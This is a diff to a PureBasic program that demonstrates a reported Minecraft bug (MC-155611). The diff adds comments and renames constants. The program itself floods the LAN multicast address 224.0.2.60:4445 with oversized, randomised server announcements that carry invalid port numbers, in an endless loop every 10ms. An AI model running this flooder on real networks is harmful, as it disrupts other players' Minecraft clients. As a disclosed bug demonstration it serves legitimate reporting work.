@@ -15,6 +15,8 @@
 ;   Github: https://github.com/aziascreations/MC-155611-Bug-Demonstration
 ;  License: Unlicense
 ;
+;  Bug Report: https://bugs.mojang.com/browse/MC-155611
+;
 ;}
 
 ;
@@ -32,6 +34,7 @@ EnableExplicit
 ; Characters used in the MOTD, only ascii characters are used to avoid dealing with UTF-8 characters' variable length.
 #MC_LAN_MOTD_ALPHABET$ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 
+; Delimiters.
 #MC_LAN_BOUND_START$ = "[MOTD]"
 #MC_LAN_BOUND_MID$ = "[/MOTD][AD]"
 #MC_LAN_BOUND_END$ = "[/AD]"
@@ -45,12 +48,18 @@ EnableExplicit
 ; Minecraft simply reads that section and assumes it is a valid port number, even if it bigger than 65535 and has non-numerical chars.
 ; It is mostly used to force Minecraft to interpret each announcement packet as a new/different server.
 #MC_LAN_BUFFER_PORT_SIZE = 10
+; These 2 constants have been added to avoid having to calculate the lower and upper bounds of the random number for the port.
 #MC_LAN_BUFFER_PORT_BOUND_UPPER = 9999999999
 #MC_LAN_BUFFER_PORT_BOUND_LOWER = 1000000000
 
-; Technically a multicast address...
-#MC_LAN_BROADCAST$ = "224.0.2.60"
-#MC_LAN_PORT = 4445
+; It's technically a multicast address...
+#MC_LAN_BROADCAST_ADDRESS$ = "224.0.2.60"
+#MC_LAN_BROADCAST_PORT = 4445
+
+; Delay in milliseconds between each packet.
+; 10ms is a good number that avoids broadcast/multicast congestion.
+; 1ms gives much better results faster.
+#MC_LAN_DELAY = 10
 
 ;}
 
@@ -82,37 +91,46 @@ If Not *PacketBuffer
 	End 3
 EndIf
 
+; Filling the buffer with random characters from '#MC_LAN_MOTD_ALPHABET$'.
 For BufferOffset = 0 To #MC_LAN_BUFFER_SIZE
 	PokeS(*PacketBuffer + BufferOffset, Mid(#MC_LAN_MOTD_ALPHABET$, Random(Len(#MC_LAN_MOTD_ALPHABET$), 1), 1), 1, #PB_Ascii | #PB_String_NoZero)
 Next
 
+; Adding the delimiters.
 PokeS(*PacketBuffer, #MC_LAN_BOUND_START$, -1, #PB_Ascii | #PB_String_NoZero)
 PokeS(*PacketBuffer + #MC_LAN_BUFFER_SIZE - Len(#MC_LAN_BOUND_MID$) - Len(#MC_LAN_BOUND_END$) - #MC_LAN_BUFFER_PORT_SIZE, #MC_LAN_BOUND_MID$, -1, #PB_Ascii | #PB_String_NoZero)
 PokeS(*PacketBuffer + #MC_LAN_BUFFER_SIZE - Len(#MC_LAN_BOUND_END$), #MC_LAN_BOUND_END$, -1, #PB_Ascii | #PB_String_NoZero)
 
+; INFO: Uncomment the following line to view the packet in memory.
 ;ShowMemoryViewer(*PacketBuffer, #MC_LAN_BUFFER_SIZE)
 
 
-;-> ???
+;-> Network part
 
-Define ConnectionID = OpenNetworkConnection(#MC_LAN_BROADCAST$, #MC_LAN_PORT, #PB_Network_UDP)
+Define ConnectionID = OpenNetworkConnection(#MC_LAN_BROADCAST_ADDRESS$, #MC_LAN_BROADCAST_PORT, #PB_Network_UDP)
 If ConnectionID
-	MessageRequester("PureBasic", "Connection established.", 0)
+	MessageRequester("PureBasic", "Connection established."+#CRLF$+#CRLF$+"Press 'Ok' to start.", 0)
 	
 	Repeat
+		; Changing the port number in the buffer
 		PokeS(*PacketBuffer + #MC_LAN_BUFFER_SIZE - Len(#MC_LAN_BOUND_END$) - #MC_LAN_BUFFER_PORT_SIZE, Str(Random(#MC_LAN_BUFFER_PORT_BOUND_UPPER, #MC_LAN_BUFFER_PORT_BOUND_LOWER)), -1, #PB_Ascii | #PB_String_NoZero)
+		
+		; Sending the packet
 		SendNetworkData(ConnectionID, *PacketBuffer, #MC_LAN_BUFFER_SIZE)
-		Delay(10)
+		
+		Delay(#MC_LAN_DELAY)
 	ForEver
 EndIf
 
-MessageRequester("Error", "Can't open network connection. (Is it a broadcast address ?)", 0)
+; This code is only reached if an error occured when establishing the network connection.
+MessageRequester("Error", "Can't open network connection. (Is it a broadcast/multicast address ?)", 0)
 FreeMemory(*PacketBuffer)
 End 4
 
 ;}
 
 ; IDE Options = PureBasic 5.70 LTS (Windows - x64)
-; CursorPosition = 14
+; CursorPosition = 110
 ; Folding = -
 ; EnableXP
+; Executable = test.exe
